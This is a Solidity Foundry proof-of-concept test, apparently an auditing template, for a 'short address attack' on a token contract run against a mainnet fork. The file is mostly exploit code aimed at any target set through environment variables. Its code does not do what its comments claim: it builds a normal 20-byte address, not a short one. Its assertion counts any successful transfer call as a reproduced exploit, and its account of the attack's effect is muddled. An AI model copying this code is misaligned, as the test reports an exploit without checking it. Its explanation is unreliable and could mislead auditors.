// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Short Address Attack
/// @notice Detector: short-address-attack. The target lacks parameter length
///         validation. If a token contract expects 20-byte addresses, passing
///         a 19-byte address causes the EVM to right-pad the address with zeros,
///         drastically changing the destination (often making it look like a
///         much larger amount to the token).
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt to target's real token transfer.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        // Create an address with a trailing zero (19 bytes)
        address shortAddr = address(uint160(uint256(keccak256("short"))));
        
        // This simulates passing a 19-byte address which gets padded by 0x00.
        // TODO: Adapt to the target's transfer function.
        vm.prank(attackerEOA);
        (bool ok,) = target.call(
            abi.encodeWithSignature("transfer(address,uint256)", shortAddr, 1000 ether)
        );
        
        console.log("Call result:", ok);
        assertTrue(ok, "exploit did not reproduce: transfer was not called");
    }
}
